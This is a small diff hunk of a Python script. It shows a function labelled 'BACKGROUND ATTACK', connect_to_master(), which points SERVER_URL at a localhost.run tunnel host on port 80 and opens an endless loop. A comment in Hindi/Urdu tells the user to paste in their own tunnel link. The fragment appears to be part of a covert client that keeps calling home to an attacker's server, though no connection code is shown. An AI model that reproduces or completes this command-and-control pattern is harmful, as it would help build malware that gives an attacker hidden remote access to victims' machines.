@@ -6,7 +6,7 @@ import time
 # --- BACKGROUND ATTACK ---
 def connect_to_master():
     # YAHAN AAPKA LOCALHOST.RUN WALA LINK AAYEGA
-    SERVER_URL = '0cd184229b0b1d.lhr.life' 
+    SERVER_URL = '0cd184229b0b1d.lhr.life'
     PORT = 80
     
     while True:
